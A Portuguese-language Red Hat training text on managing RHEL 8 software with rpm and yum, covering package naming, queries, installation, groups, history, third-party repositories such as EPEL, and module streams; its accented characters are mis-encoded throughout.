Originalmente, a Red Hat desenvolveu o RPM Package Manager, que oferece uma forma padr√£o para o empacotamento de software para distribui√ß√£o. O gerenciamento de software na forma de pacotes RPM √© muito mais simples do que o trabalho com software simplesmente extra√≠do para um sistema de arquivos a partir de um arquivo compactado. Ele permite que os administradores rastreiem quais arquivos foram instalados pelo pacote de software e quais precisar√£o ser removidos quando ele for desinstalado, bem como verificar se os pacotes de suporte est√£o presentes quando ele est√° instalado. As informa√ß√µes sobre pacotes instalados s√£o armazenadas em um banco de dados RPM local em cada sistema. Todo software fornecido pela Red Hat para o Red Hat Enterprise Linux √© oferecido como um pacote RPM.
Os nomes dos arquivos do pacote RPM consistem em quatro elementos (com o sufixo .rpm): name-version-release.architecture:
rpm-name-structure.png
NAME √© uma ou mais palavras que descrevem o conte√∫do (coreutils). VERSION √© o n√∫mero da vers√£o do software original (8.30). RELEASE √© o n√∫mero do lan√ßamento do pacote com base na vers√£o, e √© definido pelo empacotador, que pode n√£o ser o desenvolvedor de software original (4.el8). ARCH √© a arquitetura do processador para a qual o pacote foi compilado. noarch indica que o conte√∫do do pacote n√£o √© espec√≠fico de uma arquitetura (diferentemente de x86_64 para 64 bits, aarch64 para ARM de 64 bits e assim por diante). Apenas o nome do pacote √© necess√°rio para instalar pacotes de reposit√≥rios. Se existirem diversas vers√µes, o pacote com o n√∫mero de vers√£o superior ser√° instalado. Se existirem diversos lan√ßamentos de uma s√≥ vers√£o, o pacote com o n√∫mero superior ser√° instalado.
Cada pacote RPM √© um arquivo especial formado por tr√™s componentes:
Os arquivos instalados pelo pacote. As informa√ß√µes sobre o pacote (metadados), como nome, vers√£o, lan√ßamento, arquitetura; um sum√°rio e uma descri√ß√£o do pacote; se ele exige que outros pacotes sejam instalados; suas licen√ßas; um registro das altera√ß√µes do pacote; e outros detalhes. Os scripts que poder√£o ser executados quando o pacote for instalado, atualizado ou removido, ou ainda os que ser√£o acionados quando os pacotes forem instalados, atualizados ou removidos. Normalmente, os provedores de software assinam digitalmente os pacotes RPM usando chaves GPG (a Red Hat assina digitalmente todos os pacotes lan√ßados). O sistema RPM verifica a integridade do pacote confirmando se o pacote foi assinado pela chave GPG apropriada. O sistema RPM se recusar√° a instalar um pacote se a assinatura GPG n√£o corresponder.
Atualiza√ß√£o de software com pacotes RPM
A Red Hat gera um pacote RPM completo para atualizar o software. O administrador que instala esse pacote obt√©m apenas sua vers√£o mais recente. A Red Hat n√£o exige que os pacotes mais antigos sejam instalados e depois corrigidos com patches. Para atualizar o software, o RPM remove a vers√£o mais antiga do pacote e instala a nova vers√£o. As atualiza√ß√µes geralmente mant√™m os arquivos de configura√ß√£o, mas o empacotador da nova vers√£o define o comportamento exato.
Na maioria dos casos, apenas uma vers√£o ou um lan√ßamento de um pacote pode ser instalado por vez. No entanto, se um pacote for compilado de maneira que n√£o haja conflito de nomes de arquivos, v√°rias vers√µes poder√£o ser instaladas. O exemplo mais importante disso √© o pacote kernel. Como s√≥ √© poss√≠vel testar um novo kernel com o boot desse kernel espec√≠fico, o pacote √© projetado especificamente para que v√°rias vers√µes possam ser instaladas de uma vez. Se o novo kernel falhar durante o boot, o kernel antigo ainda estar√° dispon√≠vel e poder√° ser inicializado. Exame dos pacotes RPM
O utilit√°rio rpm √© uma ferramenta de n√≠vel inferior que pode obter informa√ß√µes sobre o conte√∫do de arquivos de pacote e pacotes instalados. Por padr√£o, ele obt√©m informa√ß√µes do banco de dados local de pacotes instalados. No entanto, voc√™ pode usar a op√ß√£o -p para especificar que voc√™ deseja obter informa√ß√µes sobre um arquivo de pacote baixado. Voc√™ pode fazer isso para inspecionar o conte√∫do do arquivo do pacote antes de instal√°-lo.
A forma geral de uma consulta √©:
rpm -q [select-options] [query-options] Consultas RPM: informa√ß√µes gerais sobre pacotes instalados
rpm -qa: lista todos os pacotes instalados rpm -qf FILENAME: encontra que pacote fornece o FILENAME [user@host ~]$ rpm -qf /etc/yum.repos.d redhat-release-8.0-0.39.el8.x86_64 Consultas RPM: informa√ß√µes sobre pacotes espec√≠ficos
rpm -q: lista qual vers√£o do pacote est√° instalada atualmente [user@host ~]$ rpm -q yum yum-4.0.9.2-4.el8.noarch rpm -qi: fornece informa√ß√µes detalhadas sobre um pacote rpm -ql: lista os arquivos instalados pelo pacote [user@host ~]$ rpm -ql yum /etc/yum.conf /etc/yum/pluginconf.d /etc/yum/protected.d /etc/yum/vars /usr/bin/yum /usr/share/man/man1/yum-aliases.1.gz /usr/share/man/man5/yum.conf.5.gz /usr/share/man/man8/yum-shell.8.gz /usr/share/man/man8/yum.8.gz rpm -qc: lista apenas os arquivos de configura√ß√£o instalados pelo pacote [user@host ~]$ rpm -qc openssh-clients /etc/ssh/ssh_config /etc/ssh/ssh_config.d/05-redhat.conf rpm -qd: lista apenas os arquivos de documenta√ß√£o instalados pelo pacote [user@host ~]$ rpm -qd openssh-clients /usr/share/man/man1/scp.1.gz /usr/share/man/man1/sftp.1.gz /usr/share/man/man1/ssh-add.1.gz /usr/share/man/man1/ssh-agent.1.gz /usr/share/man/man1/ssh-copy-id.1.gz /usr/share/man/man1/ssh-keyscan.1.gz /usr/share/man/man1/ssh.1.gz /usr/share/man/man5/ssh_config.5.gz /usr/share/man/man8/ssh-pkcs11-helper.8.gz rpm -q --scripts: lista os scripts de shell que s√£o executados antes e depois de o pacote ter sido instalado ou removido [user@host ~]$ rpm -q --scripts openssh-server preinstall scriptlet (using /bin/sh): getent group sshd &amp;gt;/dev/null || groupadd -g 74 -r sshd || : getent passwd sshd &amp;gt;/dev/null || \ useradd -c &amp;quot;Privilege-separated SSH&amp;quot; -u 74 -g sshd \ -s /sbin/nologin -r -d /var/empty/sshd sshd 2&amp;gt; /dev/null || : postinstall scriptlet (using /bin/sh): if [ $1 -eq 1 ] ; then # Initial installation /usr/bin/systemctl preset sshd.service sshd.socket &amp;gt;/dev/null 2&amp;gt;&amp;amp;1 || : fi preuninstall scriptlet (using /bin/sh): if [ $1 -eq 0 ] ; then # Package removal, not upgrade /usr/bin/systemctl --no-reload disable sshd.service sshd.socket &amp;gt; /dev/null 2&amp;gt;&amp;amp;1 || : /usr/bin/systemctl stop sshd.service sshd.socket &amp;gt; /dev/null 2&amp;gt;&amp;amp;1 || : fi postuninstall scriptlet (using /bin/sh): /usr/bin/systemctl daemon-reload &amp;gt;/dev/null 2&amp;gt;&amp;amp;1 || : if [ $1 -ge 1 ] ; then # Package upgrade, not uninstall /usr/bin/systemctl try-restart sshd.service &amp;gt;/dev/null 2&amp;gt;&amp;amp;1 || : fi rpm -q --changelog: lista as informa√ß√µes de altera√ß√µes do pacote [user@host ~]$ rpm -q --changelog audit * Wed Jan 09 2019 Steve Grubb &amp;lt;sgrubb@redhat.com&amp;gt; 3.0-0.10.20180831git0047a6c resolves: rhbz#1655270] Message &amp;quot;audit: backlog limit exceeded&amp;quot; reported - Fix annobin failure * Fri Dec 07 2018 Steve Grubb &amp;lt;sgrubb@redhat.com&amp;gt; 3.0-0.8.20180831git0047a6c resolves: rhbz#1639745 - build requires go-toolset-7 which is not available resolves: rhbz#1643567 - service auditd stop exits prematurely resolves: rhbz#1616428 - Update git snapshot of audit package - Remove static libs subpackage ...output omitted... Consulta de arquivos de pacotes:
[user@host ~]$ ls -l wonderwidgets-1.0-4.x86_64.rpm -rw-rw-r&amp;ndash;. 1 user user 257 Mar 13 20:06 wonderwidgets-1.0-4.x86_64.rpm [user@host ~]$ rpm -qlp wonderwidgets-1.0-4.x86_64.rpm /etc/wonderwidgets.conf /usr/bin/wonderwidgets /usr/share/doc/wonderwidgets-1.0 /usr/share/doc/wonderwidgets-1.0/README.txt
Instala√ß√£o de pacotes RPM
O comando rpm tamb√©m pode ser usado para instalar um pacote RPM que voc√™ baixou para seu diret√≥rio local.
[root@host ~]# rpm -ivh wonderwidgets-1.0-4.x86_64.rpm Verifying&amp;hellip; ################################# [100%] Preparing&amp;hellip; ################################# [100%] Updating / installing&amp;hellip; 1:wonderwidgets-1.0-4 ################################# [100%] [root@host ~]#
No entanto, a pr√≥xima se√ß√£o deste cap√≠tulo discutir√° uma ferramenta mais avan√ßada para gerenciar a instala√ß√£o e as atualiza√ß√µes do RPM a partir da linha de comando, yum. Aten√ß√£o
Tenha cuidado ao instalar pacotes de terceiros, n√£o s√≥ devido aos softwares que eles podem instalar, mas tamb√©m porque o pacote RPM pode conter scripts arbitr√°rios que s√£o executados com o usu√°rio root como parte do processo de instala√ß√£o. Nota
Voc√™ pode extrair arquivos de um arquivo de pacote RPM sem instalar o pacote. O utilit√°rio rpm2cpio pode passar o conte√∫do do RPM para uma ferramenta especial de arquivamento chamada cpio, que pode extrair todos os arquivos ou arquivos individuais.
Redirecione a sa√≠da de rpm2cpio PACKAGEFILE.rpm para cpio -id a fim de extrair todos os arquivos armazenados no pacote RPM. √Årvores de subdiret√≥rio s√£o criadas conforme necess√°rio, relativas ao diret√≥rio de trabalho atual.
[user@host tmp-extract]$ rpm2cpio wonderwidgets-1.0-4.x86_64.rpm | cpio -id
Os arquivos individuais s√£o extra√≠dos ao especificar o caminho do arquivo:
[user@host ~]$ rpm2cpio wonderwidgets-1.0-4.x86_64.rpm | cpio -id &amp;ldquo;*txt&amp;rdquo; 11 blocks [user@host ~]$ ls -l usr/share/doc/wonderwidgets-1.0/ total 4 -rw-r&amp;ndash;r&amp;ndash;. 1 user user 76 Feb 13 19:27 README.txt
Sum√°rio dos comandos de consulta do RPM Os pacotes instalados podem ser consultados diretamente com o comando rpm. Adicione a op√ß√£o -p para consultar um arquivo de pacote antes da instala√ß√£o.
rpm_commands.png
Instala√ß√£o e atualiza√ß√£o de pacotes de software com YUM Objetivos Depois de concluir esta se√ß√£o, voc√™ dever√° ser capaz de localizar, instalar e atualizar pacotes de software usando o comando yum. Gerenciamento de pacotes de software com YUM
O comando de baixo n√≠vel rpm pode ser usado para instalar pacotes, mas n√£o √© projetado para trabalhar com reposit√≥rios de pacotes ou resolver depend√™ncias de v√°rias fontes automaticamente.
O Yum √© projetado para ser um sistema melhor para gerenciar instala√ß√£o e atualiza√ß√µes de software baseadas em RPM. O comando yum permite instalar, atualizar, remover e obter informa√ß√µes sobre pacotes de software e suas depend√™ncias. Voc√™ pode obter um hist√≥rico das transa√ß√µes realizadas e trabalhar com v√°rios reposit√≥rios de software da Red Hat e de terceiros.
Localiza√ß√£o de software com yum
yum help exibe informa√ß√µes de uso. yum list exibe os pacotes instalados e dispon√≠veis. [user@host ~]$ yum list &#39;http*&#39; Available Packages http-parser.i686 2.8.0-2.el8 rhel8-appstream http-parser.x86_64 2.8.0-2.el8 rhel8-appstream httpcomponents-client.noarch 4.5.5-4.module&#43;el8&#43;2452&#43;b359bfcd rhel8-appstream httpcomponents-core.noarch 4.4.10-3.module&#43;el8&#43;2452&#43;b359bfcd rhel8-appstream httpd.x86_64 2.4.37-7.module&#43;el8&#43;2443&#43;605475b7 rhel8-appstream httpd-devel.x86_64 2.4.37-7.module&#43;el8&#43;2443&#43;605475b7 rhel8-appstream httpd-filesystem.noarch 2.4.37-7.module&#43;el8&#43;2443&#43;605475b7 rhel8-appstream httpd-manual.noarch 2.4.37-7.module&#43;el8&#43;2443&#43;605475b7 rhel8-appstream httpd-tools.x86_64 2.4.37-7.module&#43;el8&#43;2443&#43;605475b7 rhel8-appstream yum search KEYWORD lista pacotes por palavras-chave encontradas somente nos campos de nome e sum√°rio. Para procurar pacotes que tenham ‚Äúservidor web‚Äù nos campos de nome, sum√°rio e descri√ß√£o, use search all: [user@host ~]$ yum search all &#39;web server&#39; ================= Summary &amp;amp; Description Matched: web server ==================== pcp-pmda-weblog.x86_64 : Performance Co-Pilot (PCP) metrics from web server logs nginx.x86_64 : A high performance web server and reverse proxy server ======================== Summary Matched: web server =========================== libcurl.x86_64 : A library for getting files from web servers libcurl.i686 : A library for getting files from web servers libcurl.x86_64 : A library for getting files from web servers ====================== Description Matched: web server ========================= httpd.x86_64 : Apache HTTP Server git-instaweb.x86_64 : Repository browser in gitweb ...output omitted... yum info PACKAGENAME fornece informa√ß√µes detalhadas sobre um pacote, incluindo o espa√ßo em disco necess√°rio para a instala√ß√£o. Para obter informa√ß√µes sobre o Servidor HTTP Apache: [user@host ~]$ yum info httpd Available Packages Name : httpd Version : 2.4.37 Release : 7.module&#43;el8&#43;2443&#43;605475b7 Arch : x86_64 Size : 1.4 M Source : httpd-2.4.37-7.module&#43;el8&#43;2443&#43;605475b7.src.rpm Repo : rhel8-appstream Summary : Apache HTTP Server URL : https://httpd.apache.org/ License : ASL 2.0 Description : The Apache HTTP Server is a powerful, efficient, and extensible : web server. yum provides PATHNAME exibe os pacotes correspondentes ao nome do caminho especificado (que, muitas vezes, inclui caracteres curinga). Para encontrar pacotes que fornecem o diret√≥rio /var/www/html, use: [user@host ~]$ yum provides /var/www/html httpd-filesystem-2.4.37-7.module&#43;el8&#43;2443&#43;605475b7.noarch : The basic directory layout for the Apache HTTP server Repo : rhel8-appstream Matched from: Filename : /var/www/html Instala√ß√£o e remo√ß√£o de software com yum
yum install PACKAGENAME obt√©m e instala um pacote de software, incluindo todas as depend√™ncias. [user@host ~]$ yum install httpd Dependencies resolved. ================================================================================ Package Arch Version Repository Size ================================================================================ Installing: httpd x86_64 2.4.37-7.module... rhel8-appstream 1.4 M Installing dependencies: apr x86_64 1.6.3-8.el8 rhel8-appstream 125 k apr-util x86_64 1.6.1-6.el8 rhel8-appstream 105 k ...output omitted... Transaction Summary ================================================================================ Install 9 Packages Total download size: 2.0 M Installed size: 5.4 M Is this ok [y/N]: y Downloading Packages: (1/9): apr-util-bdb-1.6.1-6.el8.x86_64.rpm 464 kB/s | 25 kB 00:00 (2/9): apr-1.6.3-8.el8.x86_64.rpm 1.9 MB/s | 125 kB 00:00 (3/9): apr-util-1.6.1-6.el8.x86_64.rpm 1.3 MB/s | 105 kB 00:00 ...output omitted... Total 8.6 MB/s | 2.0 MB 00:00 Running transaction check Transaction check succeeded. Running transaction test Transaction test succeeded. Running transaction Preparing : 1/1 Installing : apr-1.6.3-8.el8.x86_64 1/9 Running scriptlet: apr-1.6.3-8.el8.x86_64 1/9 Installing : apr-util-bdb-1.6.1-6.el8.x86_64 2/9 ...output omitted... Installed: httpd-2.4.37-7.module&#43;el8&#43;2443&#43;605475b7.x86_64 apr-util-bdb-1.6.1-6.el8.x86_64 apr-util-openssl-1.6.1-6.el8.x86_64 apr-1.6.3-8.el8.x86_64 ...output omitted... Complete! yum update PACKAGENAME obt√©m e instala uma vers√£o mais recente do pacote especificado, incluindo todas as depend√™ncias. Em geral, o processo tenta preservar os arquivos de configura√ß√£o no local, mas em alguns casos eles poder√£o ser renomeados se o empacotador achar que o antigo n√£o funcionar√° ap√≥s a atualiza√ß√£o. Sem um PACKAGENAME especificado, ele instala todas as atualiza√ß√µes relevantes. [user@host ~]$ sudo yum update Como s√≥ √© poss√≠vel testar um novo kernel com o boot desse kernel espec√≠fico, o pacote √© projetado especificamente para que v√°rias vers√µes possam ser instaladas de uma vez. Se o novo kernel falhar durante o boot, o kernel antigo ainda estar√° dispon√≠vel. O uso de yum update kernel instalar√° de fato o novo kernel. Os arquivos de configura√ß√£o mant√™m uma lista de pacotes para sempre instalar, mesmo se o administrador solicitar uma atualiza√ß√£o. Nota Use yum list kernel para listar todos os kernels instalados e dispon√≠veis. Para ver qual kernel est√° em execu√ß√£o, use o comando uname. A op√ß√£o -r mostra apenas a vers√£o e o lan√ßamento do kernel; a op√ß√£o -a mostra o lan√ßamento do kernel e informa√ß√µes adicionais. [user@host ~]$ yum list kernel Installed Packages kernel.x86_64 4.18.0-60.el8 @anaconda kernel.x86_64 4.18.0-67.el8 @rhel-8-for-x86_64-baseos-htb-rpms [user@host ~]$ uname -r 4.18.0-60.el8.x86_64 [user@host ~]$ uname -a Linux host.lab.example.com 4.18.0-60.el8.x86_64 #1 SMP Fri Jan 11 19:08:11 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux yum remove PACKAGENAME remove um pacote de software instalado, incluindo todos os pacotes compat√≠veis. [user@host ~]$ sudo yum remove httpd Aten√ß√£o O comando yum remove remove os pacotes listados e todos os pacotes que exigem os pacotes que est√£o sendo removidos (e os pacotes que exigem esses pacotes e assim por diante). Isso pode levar √† remo√ß√£o inesperada de pacotes; portanto, revise cuidadosamente a lista de pacotes a serem removidos. Instala√ß√£o e remo√ß√£o de grupos de software com yum
O yum tamb√©m tem o conceito de grupos, que s√£o cole√ß√µes de softwares relacionados e instalados em conjunto para uma finalidade espec√≠fica. No Red Hat Enterprise Linux 8, h√° dois tipos de grupo. Grupos regulares s√£o cole√ß√µes de pacotes. Grupos de ambiente s√£o cole√ß√µes de grupos regulares. Os pacotes ou os grupos fornecidos por um grupo podem ser obrigat√≥rios (dever√£o ser instalados se o grupo estiver instalado), padr√£o (normalmente, estar√£o instalados se o grupo estiver instalado) ou opcionais (n√£o ser√£o instalados quando o grupo for instalado, a menos que solicitados especificamente). Assim como yum list, o comando yum group list exibe os nomes dos grupos instalados e dispon√≠veis. [user@host ~]$ yum group list Available Environment Groups: Server with GUI Minimal Install Server ...output omitted... Available Groups: Container Management .NET Core Development RPM Development Tools ...output omitted... Alguns grupos s√£o normalmente instalados por meio de grupos de ambiente e s√£o ocultos por padr√£o. Liste os grupos ocultos com o comando yum group list hidden. yum group info exibe informa√ß√µes sobre um grupo. Inclui uma lista de nomes de pacotes obrigat√≥rios, padr√£o e opcionais. [user@host ~]$ yum group info &amp;quot;RPM Development Tools&amp;quot; Group: RPM Development Tools Description: These tools include core development tools such rpmbuild. Mandatory Packages: redhat-rpm-config rpm-build Default Packages: rpmdevtools Optional Packages: rpmlint yum group install instala um grupo que faz a instala√ß√£o de seus pacotes obrigat√≥rios e padr√£o, al√©m daqueles dos quais ele depende. [user@host ~]$ sudo yum group install &amp;quot;RPM Development Tools&amp;quot; ...output omitted... Installing Groups: RPM Development Tools Transaction Summary =============================================================================== Install 64 Packages Total download size: 21 M Installed size: 62 M Is this ok [y/N]: y ...output omitted... Importante
O comportamento dos grupos YUM mudou a partir do Red Hat Enterprise Linux 7. No RHEL 7 e posteriores, os grupos s√£o tratados como objetos e rastreados pelo sistema. Se um grupo instalado for atualizado e novos pacotes obrigat√≥rios ou padr√£o tiverem sido adicionados ao grupo pelo reposit√≥rio YUM, esses novos pacotes ser√£o instalados na atualiza√ß√£o.
O RHEL 6 (e anteriores) considerar√° um grupo instalado se todos os pacotes obrigat√≥rios tiverem sido instalados, se ele n√£o tiver pacotes obrigat√≥rios ou se qualquer pacote padr√£o ou opcional do grupo estiver instalado. A partir do RHEL 7, um grupo ser√° considerado instalado somente se yum group install tiver sido usado para instal√°-lo. O comando yum group mark install GROUPNAME pode ser usado para marcar um grupo como instalado, e todos os pacotes ausentes e suas depend√™ncias ser√£o instalados na pr√≥xima atualiza√ß√£o.
Por fim, o RHEL 6 (e anteriores) n√£o tem a forma de duas palavras dos comandos yum group. Em outras palavras, no RHEL 6, o comando yum grouplist existe, mas o comando equivalente yum group list do RHEL 7 e RHEL 8 n√£o.
Visualiza√ß√£o do hist√≥rico de transa√ß√µes
Todas as transa√ß√µes de instala√ß√£o e remo√ß√£o s√£o registradas em log em /var/log/dnf.rpm.log. [user@host ~]$ tail -5 /var/log/dnf.rpm.log 2019-02-26T18:27:00Z SUBDEBUG Installed: rpm-build-4.14.2-9.el8.x86_64 2019-02-26T18:27:01Z SUBDEBUG Installed: rpm-build-4.14.2-9.el8.x86_64 2019-02-26T18:27:01Z SUBDEBUG Installed: rpmdevtools-8.10-7.el8.noarch 2019-02-26T18:27:01Z SUBDEBUG Installed: rpmdevtools-8.10-7.el8.noarch 2019-02-26T18:38:40Z INFO --- logging initialized --- yum history exibe um sum√°rio das transa√ß√µes de instala√ß√£o e remo√ß√£o. [user@host ~]$ sudo yum history ID | Command line | Date and time | Action(s) | Altered ------------------------------------------------------------------------------- 7 | group install RPM Develo | 2019-02-26 13:26 | Install | 65 6 | update kernel | 2019-02-26 11:41 | Install | 4 5 | install httpd | 2019-02-25 14:31 | Install | 9 4 | -y install @base firewal | 2019-02-04 11:27 | Install | 127 EE 3 | -C -y remove firewalld - | 2019-01-16 13:12 | Removed | 11 EE 2 | -C -y remove linux-firmw | 2019-01-16 13:12 | Removed | 1 1 | | 2019-01-16 13:05 | Install | 447 EE A op√ß√£o history undo inverte uma transa√ß√£o. [user@host ~]$ sudo yum history undo 5 Undoing transaction 7, from Tue 26 Feb 2019 10:40:32 AM EST Install apr-1.6.3-8.el8.x86_64 @rhel8-appstream Install apr-util-1.6.1-6.el8.x86_64 @rhel8-appstream Install apr-util-bdb-1.6.1-6.el8.x86_64 @rhel8-appstream Install apr-util-openssl-1.6.1-6.el8.x86_64 @rhel8-appstream Install httpd-2.4.37-7.module&#43;el8&#43;2443&#43;605475b7.x86_64 @rhel8-appstream ...output omitted... Sum√°rio de comandos yum √â poss√≠vel localizar, instalar, atualizar e remover pacotes por nome ou grupos de pacotes.
yum_commands.png
Ativa√ß√£o de reposit√≥rios de software YUM Objetivos Depois de concluir esta se√ß√£o, voc√™ dever√° ser capaz de ativar e desativar o uso de reposit√≥rios YUM da Red Hat ou de terceiros por um servidor. Ativa√ß√£o de reposit√≥rios de software da Red Hat
O registro de um sistema no servi√ßo de gerenciamento de subscri√ß√µes configura automaticamente o acesso a reposit√≥rios de software com base nas subscri√ß√µes anexadas. Para ver todos os reposit√≥rios dispon√≠veis:
[user@host ~]$ yum repolist all &amp;hellip;output omitted&amp;hellip; rhel-8-for-x86_64-appstream-debug-rpms &amp;hellip; AppStream (Debug RPMs) disabled rhel-8-for-x86_64-appstream-rpms &amp;hellip; AppStream (RPMs) enabled: 5,045 rhel-8-for-x86_64-appstream-source-rpms &amp;hellip; AppStream (Source RPMs) disabled rhel-8-for-x86_64-baseos-debug-rpms &amp;hellip; BaseOS (Debug RPMs) enabled: 2,270 rhel-8-for-x86_64-baseos-rpms &amp;hellip; BaseOS (RPMs) enabled: 1,963 &amp;hellip;output omitted&amp;hellip;
O comando yum config-manager pode ser usado para ativar ou desativar reposit√≥rios. Para ativar um reposit√≥rio, o comando define o par√¢metro enabled como 1. Por exemplo, o seguinte comando ativa o reposit√≥rio rhel-8-server-debug-rpms:
[user@host ~]$ yum config-manager &amp;ndash;enable rhel-8-server-debug-rpms Updating Subscription Management repositories. ============= repo: rhel-8-for-x86_64-baseos-debug-rpms ============ [rhel-8-for-x86_64-baseos-debug-rpms] bandwidth = 0 baseurl = [https://cdn.redhat.com/content/dist/rhel8/8/x86_64/baseos/debug] cachedir = /var/cache/dnf cost = 1000 deltarpm = 1 deltarpm_percentage = 75 enabled = 1 &amp;hellip;output omitted&amp;hellip;
As fontes que n√£o sejam a Red Hat fornecem softwares por meio de reposit√≥rios de terceiros, os quais podem ser acessados pelo comando yum em um site, um servidor FTP ou o sistema de arquivos local. Por exemplo, a Adobe fornece alguns de seus softwares para Linux por meio de um reposit√≥rio YUM. Na sala de aula da Red Hat, o servidor da sala de aula content.example.com hospeda reposit√≥rios YUM.
Para ativar o suporte a um novo reposit√≥rio de terceiros, crie um arquivo no diret√≥rio /etc/yum.repos.d/. Os arquivos de configura√ß√£o do reposit√≥rio devem terminar com a extens√£o .repo. A defini√ß√£o do reposit√≥rio cont√©m o URL do reposit√≥rio, um nome, se o GPG deve ou n√£o ser usado para verificar as assinaturas do pacote e, se for o caso, o URL apontando para a chave GPG confi√°vel.
Cria√ß√£o de reposit√≥rios YUM
Crie reposit√≥rios YUM com o comando yum config-manager. O comando a seguir cria um arquivo denominado /etc/yum.repos.d/dl.fedoraproject.org_pub_epel_8_Everything_x86_64_.repo com a sa√≠da apresentada.
[user@host ~]$ yum config-manager &amp;ndash;add-repo=&amp;ldquo;https://dl.fedoraproject.org/pub/epel/8/Everything/x86_64/&amp;quot; Adding repo from: https://dl.fedoraproject.org/pub/epel/8/Everything/x86_64/
[dl.fedoraproject.org_pub_epel_8_Everything_x86_64_] name=created by yum config-manager from https://dl.fedoraproject.org/pub/epel/8/Everything/x86_64/ baseurl=https://dl.fedoraproject.org/pub/epel/8/Everything/x86_64/ enabled=1
Modifique o arquivo para fornecer valores personalizados e o local de uma chave GPG. As chaves s√£o armazenadas em v√°rios locais no site do reposit√≥rio remoto, como http://dl.fedoraproject.org/pub/epel/RPM-GPG-KEY-EPEL-8. Os administradores devem fazer o download da chave para um arquivo local em vez de permitir que o yum obtenha a chave de uma fonte externa. Por exemplo:
[EPEL] name=EPEL 8 baseurl=https://dl.fedoraproject.org/pub/epel/8/Everything/x86_64/ enabled=1 gpgcheck=1 gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-EPEL-8
Pacotes de configura√ß√£o RPM para reposit√≥rios locais
Alguns reposit√≥rios fornecem um arquivo de configura√ß√£o e a chave p√∫blica GPG como parte de um pacote RPM, que pode ser baixado e instalado usando o comando yum localinstall. Por exemplo, o projeto volunt√°rio denominado Pacotes adicional para Enterprise Linux (EPEL, Extra Packages for Enterprise Linux) fornece software que n√£o tem suporte da Red Hat, mas √© compat√≠vel com o Red Hat Enterprise Linux.
O seguinte comando instala o pacote de reposit√≥rio do EPEL para Red Hat Enterprise Linux 8:
[user@host ~]$ rpm &amp;ndash;import http://dl.fedoraproject.org/pub/epel/RPM-GPG-KEY-EPEL-8 [user@host ~]$ yum install https://dl.fedoraproject.org/pub/epel/epel-release-latest-8.noarch.rpm
Os arquivos de configura√ß√£o geralmente listam v√°rias refer√™ncias de reposit√≥rio em um s√≥ arquivo. Cada refer√™ncia de reposit√≥rio come√ßa com um nome de uma √∫nica palavra entre colchetes.
[user@host ~]$ cat /etc/yum.repos.d/epel.repo [epel] name=Extra Packages for Enterprise Linux $releasever - $basearch #baseurl=https://download.fedoraproject.org/pub/epel/$releasever/Everything/$basearch metalink=https://mirrors.fedoraproject.org/metalink?repo=epel-$releasever&amp;amp;arch=$basearch&amp;amp;infra=$infra&amp;amp;content=$contentdir enabled=1 gpgcheck=1 gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-EPEL-8
[epel-debuginfo] name=Extra Packages for Enterprise Linux $releasever - $basearch - Debug #baseurl=https://download.fedoraproject.org/pub/epel/$releasever/Everything/$basearch/debug metalink=https://mirrors.fedoraproject.org/metalink?repo=epel-debug-$releasever&amp;amp;arch=$basearch&amp;amp;infra=$infra&amp;amp;content=$contentdir enabled=0 gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-EPEL-8 gpgcheck=1
[epel-source] name=Extra Packages for Enterprise Linux $releasever - $basearch - Source #baseurl=https://download.fedoraproject.org/pub/epel/$releasever/Everything/SRPMS metalink=https://mirrors.fedoraproject.org/metalink?repo=epel-source-$releasever&amp;amp;arch=$basearch&amp;amp;infra=$infra&amp;amp;content=$contentdir enabled=0 gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-EPEL-8 gpgcheck=1
Para definir um reposit√≥rio, mas n√£o pesquisar nele por padr√£o, insira o par√¢metro enabled=0. Os reposit√≥rios podem ser ativados e desativados de modo persistente com o comando yum config-manager ou temporariamente com as op√ß√µes de comando do yum, &amp;ndash;enablerepo=PATTERN e &amp;ndash;disablerepo=PATTERN. Aten√ß√£o
Instale a chave GPG do RPM antes de instalar pacotes assinados. Isso verifica se os pacotes pertencem a uma chave que foi importada. Caso contr√°rio, ocorre uma falha no comando yum devido √† aus√™ncia da chave. A op√ß√£o &amp;ndash;nogpgcheck pode ser usada para ignorar chaves GPG ausentes, mas isso faz com que pacotes forjados ou sem prote√ß√£o sejam instalados no sistema, comprometendo potencialmente a seguran√ßa.
Gerenciamento de fluxos de m√≥dulos de pacote Objetivos Depois de concluir esta se√ß√£o, voc√™ dever√° ser capaz de:
Explicar como os m√≥dulos permitem a instala√ß√£o de vers√µes espec√≠ficas do software. Saber listar, ativar e alternar os fluxos de m√≥dulos. Instalar e atualizar pacotes a partir de um m√≥dulo. Introdu√ß√£o ao fluxo de aplicativos
O Red Hat Enterprise Linux 8.0 apresenta o conceito de fluxos de aplicativos. V√°rias vers√µes de componentes do espa√ßo do usu√°rio fornecidas com a distribui√ß√£o agora s√£o entregues ao mesmo tempo. Eles podem ser atualizados com mais frequ√™ncia do que os pacotes principais do sistema operacional. Isso proporciona maior flexibilidade para personalizar o Red Hat Enterprise Linux sem afetar a estabilidade subjacente da plataforma ou de implementa√ß√µes espec√≠ficas.
Tradicionalmente, gerenciar vers√µes alternativas do pacote de software de um aplicativo e seus pacotes relacionados significava manter reposit√≥rios diferentes para cada vers√£o. Para os desenvolvedores que desejavam usar a vers√£o mais recente de um aplicativo e os administradores que desejavam usar a vers√£o mais est√°vel do aplicativo, isso criava uma situa√ß√£o mon√≥tona de gerenciar. Todo esse processo foi simplificado no Red Hat Enterprise Linux 8 usando uma nova tecnologia denominada Modularidade. A modularidade permite que um s√≥ reposit√≥rio hospede diversas vers√µes de pacote de um aplicativo e suas depend√™ncias.
O conte√∫do do Red Hat Enterprise Linux 8 √© distribu√≠do por meio de dois reposit√≥rios de software principais: BaseOS e fluxo de aplicativos (AppStream).
BaseOS
O reposit√≥rio BaseOS fornece o conte√∫do do sistema operacional principal para o Red Hat Enterprise Linux como pacotes de RPM. Os componentes do BaseOS t√™m um ciclo de vida id√™ntico ao do conte√∫do das vers√µes anteriores do Red Hat Enterprise Linux.
Fluxo de aplicativos
O reposit√≥rio AppStream fornece conte√∫do com ciclos de vida variados, que incluem m√≥dulos e pacotes tradicionais. O AppStream cont√©m partes necess√°rias do sistema, bem como uma ampla variedade de aplicativos dispon√≠veis anteriormente junto com as cole√ß√µes de software da Red Hat e com outros produtos e programas. Importante
O BaseOS e o AppStream s√£o uma parte necess√°ria do sistema Red Hat Enterprise Linux 8.
